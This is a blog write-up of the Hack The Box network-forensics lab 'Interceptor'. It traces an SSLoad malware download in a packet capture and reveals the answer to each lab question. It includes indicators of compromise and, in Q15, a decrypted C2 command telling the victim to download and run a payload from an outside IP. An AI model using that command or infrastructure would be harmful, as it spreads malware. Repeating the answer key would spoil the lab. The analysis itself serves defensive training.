---
author: Ricard Alcaraz Mancebo
title: Interceptor - Hack The Box
tags:
  - Cybersecurity
  - Blue Team
  - Network Forensics
languages:
  - wireshark
  - virustotal
  - cyberchef
image:
  url: https://ricard-alcaraz.com/images/interceptor-htb/main.png
  alt: hack the box lab Interceptor
description: My notes solving Interceptor - Hack The Box
pubDate: 2025-09-07T11:34:00.000+02:00
---
## Scenario
A recent anomaly has been detected in our network traffic, suggesting a potential breach. Our team suspects that an unauthorized entity has infiltrated our systems and accessed confidential company data. Your mission is to unravel this mystery, understand the breach, and determine the extent of the compromised data.

## Provided Documents
- interceptor.pcap

## Q1: What IP address did the original suspicious traffic come from?

First of all I did check the first packets of the PCAP, the first thing I noticed was a DNS query to a domain, so I wanted to check this domain using `VirusTotal` to see if it was a flagged domain:

![virustotal screenshot](/images/interceptor-htb/q1.png)

The result is that 10 vendors flaged it as a malicious domain, so this seems to be already suspicious, now we can check the IP of this domain, and we will see that is the origin of the suspicious traffic. For example looking at the source address of the `Client Hello` from the TLS handshake protocol.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    10.4.17.101
  </div>
</details>

## Q2: The attacker downloaded a suspicious file. What is the HTTP method used to retrieve the properties of this file?

For this one I started looking at the files downloaded, using the query:
```
http.request.method == GET
```
Then I found some files downloaded:

![wireshark http GET](/images/interceptor-htb/q2.png)

Honestly I found suspicious the firsts two because the path was really long and with a weird naming, then I took a look at all the HTTP packets. And I saw that these two were the first HTTP packets so there is no previous method to retrieve properties, so it must be other one, following with all the HTTP packets we can see that at some point its starting to use one method that is used to retrieve properties, and then we will see a match with one of the other files that appear at the query of the GET method, this is the one we are looking for. We can see that first it retrieves the information and then it used the GET method.  So lets answer with the method used.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    PROPFIND
  </div>
</details>

## Q3: It appears that this file is malware. What is its filename?

Here we already saw from previous question which file had their properties retieved and then downloaded.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    avp.msi
  </div>
</details>

## Q4: What is the SSDEEP hash of the malware as reported by VirusTotal?

Now what I thought is about exporting the file, obtain it's hash sha256 and the search it in `VirusTotal` to get it's SSDEEP hash, and its the process I did to obtain the answer. Just be careful of exporting the correct file and not the retrieved properties of it.This is the SHA256 hash of the malicious file:
```cmd
dcae57ec4b69236146f744c143c42cc8bdac9da6e991904e6dbf67ec1179286a
```
Now just look it up on VirusTotal and you will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    24576:BqKxnNTYUx0ECIgYmfLVYeBZr7A9zdfoAX+8UhxcS:Bq6TYCZKumZr7ARdAAO8oxz
  </div>
</details>

## Q5: According to the NeikiAnalytics community comment on VirusTotal, to which family does the malware belong?

Not much here, just search the username on the community tab in `VirusTotal`

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    ssload
  </div>
</details>

## Q6: What is the creation time of the malware?

Still in `VirusTotal` you can find this information on the details tab.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    2009-12-11 11:47:44
  </div>
</details>

## Q7: What is the domain name that the malware is trying to connect with?

`VirusTotal` also provide us this information, its inside the `Relations` tab.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    api.ipify.org
  </div>
</details>

## Q8: What is the IP address that the attacker has consistently used for communication?

This information is also in `VirusTotal` but I prefered to look at the PCAP in case they are using a different IP, so just take a look at the HTTP traffic and look the packets after the malicious file download, you will find an IP to which is in constant communication.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    85.239.53.219
  </div>
</details>

## Q9: Which file, included in the original package, is extracted and utilized by the malware during execution?

Lets go back to `VirusTotal`, there is also information about related files, one you will see at the top is a type of file that can be utilized by an executable during execution. Just answer with the name of the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    forcedelctl.dll
  </div>
</details>

## Q10: What program is used to execute the malware?

For this one, I think that `VirusTotal` doesnt provide this information, so other tool we can use to find information about the execution of the malware is `ANY.RUN`. If we search the malware using the SHA256 we can see how the execution starts and what program is used to execute it. I think you can also guess the program knowing the extension of the file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    msiexec.exe
  </div>
</details>

# Q11: What is the hostname of the compromised machine?

For this question I found two ways of finding it, in both we have to go back to `Wireshark`. In one way I thought about if there was any protocol where the hostname could be seen, so I checked the `Protocol Hierarchy` too see if there was something interesting there. Then I saw that there are some packets of the protocol SMB, so applied a query to search for this SMB packets and I found the answer there.

The other way, which i think is the one that the lab wants you to go through, is looking in the HTTP protocol, and then checking the POST methods. There you can see one that goes to the path `/api/gateway`, there you can find this information.

![](/images/interceptor-htb/q11.png)

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    DESKTOP-FWQ3U4C
  </div>
</details>

## Q12: What is the key that was used in the attack?

Following the second way of previous question, looking at the response for the POST packet with the path `/api/gateway` we can find this information, I was not looking for something in particular, just checking what was this `/api/gateway` about I found the key there, there is also another parameter with the name of `id`.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    WkZPxBoH6CA3Ok4iI
  </div>
</details>

## Q13: What is the os_version of the compromised machine?

We have this information already, just check again the POST packet we saw in **Q13*.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Windows 6.3.9600
  </div>
</details>

## Q14: What is the owner name of the compromised machine?

Same as last question, the information is already there.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    Nevada
  </div>
</details>

## Q15: After decrypting the communication from the malware, what command is revealed to be sent to the C2 server?

Ok, lets see what we have and then try to solve this last decrypting challenge.
So we already have a key from **Q12** and now we need the message and the algorithm. If we follow the HTTP stream from the POST request for the key, we will see something that seems interesting later on, there is a POST request where the `id` that we found with the key is in the path:

![wireshark http stream](/images/interceptor-htb/q15-1.png)

The response contains an `id` and a `job` parameters:

```
{"id": "576ba7b6-077c-45fb-94b4-10fd156e93c3", "job": "B//jOYkMjUR2wj+L/9U9WafJi7K/GMIoeILXOeXYfdGUMV8eNqoLdrQlZ35neKaqiGJ4Vijv4WuInBYFg1nnW9sY0sdq0imYHI1jW+skjZIgz3ICgNSxOkxRTpwzCA=="}
```

The job parameter seems to me the message we have to decrypt, also If we continue looking around I dont see more data on the requests or response on the following packets, so something has to be here.

Now we have the key and the potential message to decrypt, and we need to know the algorithm. For this one I didn't know much about potential algorithms so I brute forced a little bit the posible decryptions that you can do using `CyberChef` this is a topic I need more knowledge about, and at least I could try to guess or discard some of the algorithms. And finally I found it after serveral time trying, the algorithm is `RC4`.

![cyberchef](/images/interceptor-htb/q15-2.png)

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    {"command": "exe", "args": ["http://85.239.53.219/download?id=Nevada&module=2&filename=None"]}
  </div>
</details>

